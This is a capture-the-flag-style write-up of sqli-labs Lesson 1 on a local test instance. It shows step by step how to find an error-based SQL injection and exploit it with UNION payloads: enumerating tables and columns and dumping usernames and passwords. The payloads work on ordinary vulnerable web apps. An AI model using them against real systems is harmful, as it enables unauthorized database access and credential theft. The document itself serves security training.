#### 1. Lesson 1 - ``GET - Error based - Single Quote - String``

###### Fuzzing

```
http://127.0.0.1/sqli-labs/Less-1/?id=1
http://127.0.0.1/sqli-labs/Less-1/?id=2
http://127.0.0.1/sqli-labs/Less-1/?id=3
```

![](images/1/1.png)

![](images/1/2.png)

![](images/1/3.png)

```sql
select Login name, Password from table where id = [our_input]
```

```sql
select Login name, Password from table where id = 1
select Login name, Password from table where id = 2
select Login name, Password from table where id = 3
```

```
http://127.0.0.1/sqli-labs/Less-1/?id=somevalue
http://127.0.0.1/sqli-labs/Less-1/?id=123snyt
http://127.0.0.1/sqli-labs/Less-1/?id=99999999
```

![](images/1/4.png)

![](images/1/5.png)

![](images/1/6.png)

```
http://127.0.0.1/sqli-labs/Less-1/?id=1"
```

![](images/1/7.png)

###### Vulnerability Breakdown

```
http://127.0.0.1/sqli-labs/Less-1/?id=1'
```

![](images/1/8.png)

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

```
''1'' LIMIT 0,1' at line 1
'  '1'  ' LIMIT 0,1' at line 1
   '1' ' LIMIT 0,1
'   1'    ' LIMIT 0,1
1'
```

Remove the first and the last ```'``` and 3 more quotes will be left out of which 2 of them encapsulate out input

```
http://localhost/sqli-labs/Less-1/?id=1\
```

![](images/1/9.png)

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1\' LIMIT 0,1' at line 1
```

```
''1\' LIMIT 0,1'
'1\' LIMIT 0,1
1\
```

--

###### Comments in MySQL

```
--
```

```
#
```

```
/* */
```

--

```
http://localhost/sqli-labs/Less-1/?id=1'--%20
```

![](images/1/10.png)

```
http://localhost/sqli-labs/Less-1/?id=1'#%20
http://localhost/sqli-labs/Less-1/?id=1'%23%20
```

![](images/1/11.png)

```
'1\' LIMIT 0,1
'1'--+     ' LIMIT 0,1
```

###### Fix the query

```
http://localhost/sqli-labs/Less-1/?id=1
http://localhost/sqli-labs/Less-1/?id=1'
http://localhost/sqli-labs/Less-1/?id=1'--+
```

![](images/1/12.png)

![](images/1/13.png)

![](images/1/14.png)

```
http://127.0.0.1/sqli-labs/Less-1/?id=1' AND 1=1 --+
http://127.0.0.1/sqli-labs/Less-1/?id=1' AND 1=0 --+
```

![](images/1/15.png)

![](images/1/16.png)

###### Identify the columns in the query

```
http://localhost/sqli-labs/Less-1/?id=1' order by 1--+
http://localhost/sqli-labs/Less-1/?id=1' order by 2--+
http://localhost/sqli-labs/Less-1/?id=1' order by 3--+
http://localhost/sqli-labs/Less-1/?id=1' order by 4--+
```

![](images/1/17.png)

![](images/1/18.png)

![](images/1/19.png)

![](images/1/20.png)

```sql
select col-1, col-2, col-3 from table where id = '  1' our_injection --+ ' 
```

###### Extract information

```
http://localhost/sqli-labs/Less-1/?id=1' union select 1,2,3 --+
```

![](images/1/21.png)

```
localhost/sqli-labs/Less-1/?id=999' union select 1,2,3 --+
```

![](images/1/22.png)

```
localhost/sqli-labs/Less-1/?id=999' union select 1,4,5 --+
```

![](images/1/23.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,version(),5--+
```

![](images/1/24.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,database(),5--+
```

![](images/1/25.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,user(),5--+
```

![](images/1/26.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,4,current_user--+
```

![](images/1/27.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,4,@@datadir--+
```

![](images/1/28.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA="security"--+
```

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database()--+
```

![](images/1/34.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 1,1--+
```

![](images/1/35.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 2,1--+
```

![](images/1/36.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 3,1--+
```

![](images/1/37.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 4,1--+
```

![](images/1/38.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where TABLE_SCHEMA=database()--+
```

![](images/1/39.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='users'--+
```

![](images/1/42.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='uagents'--+
```

![](images/1/43.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='referers'--+
```

![](images/1/44.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='emails'--+
```

![](images/1/45.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(username),3 from users--+
```

![](images/1/46.png)

```
http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(username),group_concat(password) from users--+
```

![](images/1/47.png)

```
database = security
tables = emails,referers,uagents,users
columns of users table = id,username,password
columns of uagents table = id,uagent,ip_address,username
columns of referers table = id,referer,ip_address
columns of emails table = id,email_id
```

###### Enumerate using ```mysql``` client

```mysql
mysql -u root -p
show databases;
use security;
```

![](images/1/29.png)

```mysql
desc emails;
desc referers;
desc uagents;
desc users;
```

![](images/1/30.png)

```mysql
show databases;
use information_schema;
```

![](images/1/31.png)

```mysql
desc TABLES;
```

![](images/1/32.png)

```mysql
select TABLE_NAME from information_schema.tables where TABLE_SCHEMA="security";
```

![](images/1/33.png)

```mysql
desc COLUMNS;
```

![](images/1/40.png)

```mysql
select COLUMN_NAME from information_schema.columns where TABLE_NAME="users";
```

![](images/1/41.png)